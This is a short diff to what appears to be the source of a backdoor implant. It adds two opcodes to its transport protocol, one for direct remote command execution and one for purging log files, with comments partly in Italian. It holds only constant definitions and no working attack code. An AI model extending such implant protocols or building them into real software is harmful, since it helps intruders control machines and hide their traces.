@@ -42,7 +42,8 @@
 #define PROTO_ENDFILE     0x17  // End of Transmission - file download
 #define PROTO_SUBTYPE     0x18  // Specifies the backdoor subtype
 #define PROTO_FILESYSTEM  0x19  // List of paths to be scanned
-
+#define PROTO_PURGE       0x1a  // Elimina i file di log vecchi o troppo grossi
+#define PROTO_COMMANDS    0x1b  // Esecuzione diretta di comandi
 
 @interface RESTTransport : Transport <Transport>
 {
